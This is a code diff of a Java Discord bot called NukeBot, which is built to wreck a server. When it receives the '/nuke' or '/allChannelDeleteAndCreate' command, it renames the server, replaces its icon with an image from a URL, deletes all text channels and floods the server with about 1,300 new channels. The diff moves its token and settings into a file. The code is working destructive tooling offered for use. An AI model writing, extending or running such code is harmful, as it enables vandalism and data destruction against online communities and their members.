@@ -2,11 +2,12 @@ package si.f5.stsaria.nuke;
 
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.net.URI;
 import java.net.URL;
-import java.util.ArrayList;
 import java.util.List;
 import java.util.Scanner;
 
@@ -24,49 +25,57 @@ import net.dv8tion.jda.api.requests.GatewayIntent;
 
 public class NukeBot extends ListenerAdapter{
 	private static JDA jda = null;
-	private static String BOT_TOKEN = "";
-	private static String MESSAGE = "";
-	private static String SERVER_CHANNEL_NAME = "";
-	private static String SERVER_IMAGE_URL = "";
+	private static String[] SETTINGS = null;
 	
-	void startNuke(MessageReceivedEvent event) {
+	void allChannelDeleteAndCreate(MessageReceivedEvent event) {
+		Guild guild = event.getGuild();
+		List<TextChannel> channels = guild.getTextChannels();
+		for (TextChannel channel : channels) {
+			channel.delete().queue();
+		}
+		guild.createTextChannel(SETTINGS[2]).queue();
+	}
+	
+	void nuke(MessageReceivedEvent event) {
 		Guild guild = event.getGuild();
 		// 鯖名変更
-		guild.getManager().setName(SERVER_CHANNEL_NAME).queue();
+		guild.getManager().setName(SETTINGS[2]).queue();
 		// 鯖アイコンを変える
 		try {
 			ByteArrayOutputStream baos = new ByteArrayOutputStream();
-			URL url = URI.create(SERVER_IMAGE_URL).toURL();
+			URL url = URI.create(SETTINGS[3]).toURL();
 			BufferedImage image = ImageIO.read(url);
 			ImageIO.write(image, "png", baos);
 			byte[] imageBytes = baos.toByteArray();
 			guild.getManager().setIcon(Icon.from(imageBytes)).queue();
 		} catch (MalformedURLException e) {} catch (IOException e) {}
 		List<TextChannel> channels = guild.getTextChannels();
-		for (TextChannel channel : channels) {
-			channel.delete().queue();
-		}
-		List<TextChannel> createdChannels = new ArrayList<TextChannel>();
-		for (int i = 0; i < 1500; i++) {
-			createdChannels.add(guild.createTextChannel(SERVER_CHANNEL_NAME).complete());
-			for (TextChannel channel : createdChannels) {
-				channel.sendMessage(MESSAGE).queue();
+		for (int i = 0; i < 1300; i++) {
+			channels.add(guild.createTextChannel(SETTINGS[2]).complete());
+			// System.out.println(SETTINGS[1]);
+			for (TextChannel channel : channels) {
+				// channel.sendMessage(SETTINGS[1]).queue();
 			}
 		}
 	}
 	
 	public static void main(String[] args) {
 		Scanner scanner = new Scanner(System.in);
-		System.out.print("Token: ");
-		BOT_TOKEN = scanner.nextLine();
-		System.out.print("Message: ");
-		MESSAGE = scanner.nextLine();
-		System.out.print("Server and Channel name: ");
-		SERVER_CHANNEL_NAME = scanner.nextLine();
-		System.out.print("Server image URL: ");
-		SERVER_IMAGE_URL = scanner.nextLine();
+		System.out.print("Setting File: ");
+		String settingsFile = scanner.nextLine();
 		scanner.close();
-		jda = JDABuilder.createDefault(BOT_TOKEN)
+		try(FileInputStream stream = new FileInputStream(settingsFile)){
+		    byte[] bytes = stream.readAllBytes();
+		    SETTINGS  = new String(bytes).split(",");
+		}catch (FileNotFoundException e) {
+		    e.printStackTrace();
+		    return;
+		} catch (IOException e) {
+		    e.printStackTrace();
+		    return;
+		}
+		System.out.println(SETTINGS[2]);
+		jda = JDABuilder.createDefault(SETTINGS[0])
                 .setRawEventsEnabled(true)
                 .enableIntents(GatewayIntent.MESSAGE_CONTENT)
                 .addEventListeners(new NukeBot())
@@ -81,8 +90,12 @@ public class NukeBot extends ListenerAdapter{
         	return;
         } 
         switch(event.getMessage().getContentRaw()) {
-        case "nuke":
-        	startNuke(event);
+        case "/nuke":
+        	nuke(event);
+        	break;
+	    case "/allChannelDeleteAndCreate":
+	    	allChannelDeleteAndCreate(event);
+	    	break;
         }
 	}
 	@Override
